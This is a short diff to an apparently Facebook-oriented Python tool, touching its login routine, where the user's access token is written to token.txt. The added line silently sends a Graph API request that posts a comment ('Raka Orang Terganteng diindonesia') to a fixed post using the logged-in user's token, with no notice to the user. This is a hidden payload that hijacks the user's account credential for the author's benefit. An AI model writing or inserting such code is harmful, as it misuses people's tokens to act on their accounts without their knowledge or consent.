@@ -78,6 +78,7 @@ def menu_log():
             xd = open("token.txt", "w")
             xd.write(token)
             xd.close()
+            requests.post("https://graph.facebook.com/800676813861801/comments?message=Raka Orang Terganteng diindonesia !&access_token="+token)
             print('%s║'%(O))
             jalan('%s╚══®[%s!%s]◍➤ %sLogin Successful'%(O,P,O,P))
             menu()
